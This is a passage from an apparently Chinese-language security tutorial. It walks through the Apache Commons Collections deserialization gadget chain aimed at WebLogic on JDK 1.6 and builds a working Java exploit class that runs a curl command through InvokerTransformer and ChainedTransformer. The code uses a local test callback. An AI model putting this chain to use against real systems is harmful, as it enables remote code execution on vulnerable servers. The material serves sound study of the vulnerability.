        }
        public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch (NoSuchMethodException var5) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
                } catch (IllegalAccessException var6) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
                } catch (InvocationTargetException var7) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
                }
            }
        }
可以看到，InvokeTransformer的构造方法把三个参数赋值，然后`transform`方法使用反射调用了我们传入的类和方法,这里`iMethodName`
`iParamTypes`
`iArgs`三个参数都是直接可控的，只需要再控制input为一个Runtime的Class实例，就可以完成调用了，相当于`Runtime.getRuntime().exec("xxxx")`。也就是说，第一行代码相当于如下操作:
    Class cls = Runtime.class;
    Method method=cls.getMethod("getRuntime");
    Object tmp1 = method.invoke(cls);
    Class cls2 = tmp1.getClass();
    Method method1 = cls2.getMethod("exec",String.class);
    method1.invoke(tmp1,"curl 127.0.0.1:1234");
#### 4.4.2 ChianedTransformer
而且这里还不是执行一个对象的某个方法，需要一个执行链，而这里正好有这么一个类，就是`ChainedTransformer`该类中也有一个transform方法：
    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }
    public Object transform(Object object) {
        for(int i = 0; i  0) {
            Map transformed = decorated.transformMap(map);
            decorated.clear();
            decorated.getMap().putAll(transformed);
        }
        return decorated;
    }
    protected Object transformKey(Object object) {
        return this.keyTransformer == null ? object : this.keyTransformer.transform(object);
    }
    public Object put(Object key, Object value) {
        key = this.transformKey(key);
        value = this.transformValue(value);
        return this.getMap().put(key, value);
    }
    public void putAll(Map mapToCopy) {
        mapToCopy = this.transformMap(mapToCopy);
        this.getMap().putAll(mapToCopy);
    }
这里用到的是`decorate`方法，因为`decorate`会调用构造函数，从而实现对类内部属性的赋值。这里还有个put方法，既满足是`public`，又满足调用了`this.transformKey`，在transformKey的构造函数中可以看到，只要我们传入的Object不是null就会执行transform方法，满足调用链，所以在本地测试的时候，可以在构造完前半部分调用一下这个put，来触发`transform`。下一步是想办法让`put`函数的第一个参数变成我们前面构造的`chain`，这里构造代码中间部分
    HashMap innerMap = new HashMap();
    innerMap.put("keykey", "vvv");
    Map outerMap = TransformedMap.decorate(innerMap, null, chain);
因为decorate有个Map类型的第一个参数，这里随便生成一个就行，主要是把前面构造的`ChainedTransformer`类型的`chain`放到第三个参数上(transformKey和transformValue都可以通过put触发transform方法，但是后面反序列化的时候调用的方法只能在value上触发，所以放到第三个参数)，为了测试，这里可以在后面手动调用一下put方法，nc监听一下，命令成功执行，此时代码是:
    package src.main.java;
    import org.apache.commons.collections.*;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollectionsExp {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers_exec = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"curl 127.0.0.1:1234"})
            };
            Transformer chain = new ChainedTransformer(transformers_exec);
            HashMap innerMap = new HashMap();
            innerMap.put("value", "asdf");
            Map outerMap = TransformedMap.decorate(innerMap, null, chain);
            //这里调用put单纯本地测试一下是否可行
            outerMap.put("aaaa","bbbbb");
        }
    }
目前找到了触发transform的类，但最终目的是反序列化的时候自动调用，所以下一步是找一个有`readObject`方法的类，并且在`readObject`需要调用刚才提到的`transform`方法。这里就用到了jdk自带的`sun.reflect.annotation.AnnotationInvocationHandler`类，由于这个类在jdk1.8得到了更新，所以一些payload不能攻击运行在jdk1.8的weblogic，这里环境还是jdk1.6。这个类的`readObject`实现如下
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;
        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }
        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();
        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    }
这里涉及到一个知识点:
>
> TransformedMap是Map类型，TransformedMap里的每个entryset在调用setValue方法时会自动调用TransformedMap类的checkSetValue方法
为什么会有上面一点呢？通过源码可以看到`TransformedMap`继承了`AbstractInputCheckedMapDecorator`类，而在这个类中可以看到如下代码
    static class MapEntry extends AbstractMapEntryDecorator {
        private final AbstractInputCheckedMapDecorator parent;
        protected MapEntry(Entry entry, AbstractInputCheckedMapDecorator parent) {
            super(entry);
            this.parent = parent;
        }
        public Object setValue(Object value) {
            value = this.parent.checkSetValue(value);
            return super.entry.setValue(value);
        }
    }
可以看到，在这个类中实现了setValue方法，在setValue的时候会调用`checkSetValue`方法。
在上面的`readObject`中可以看到，var5正好是`this.memberValues.entrySet()`的Entry类，而且调用了`setValue`方法，那么在`var5.setValue`被调用时，同时会调用
    protected Object checkSetValue(Object value) {
        return this.valueTransformer.transform(value);
    }
在这里，就调用了transform方法，由于调用的是`valueTransformer`，所以在上面构造exp的时候把chain放在value那了。
由于var5是从`this.memberValues`取的，这个就是构造函数的第二个参数，所以构造函数的第二个参数放上面生成的`outerMap`就ok了。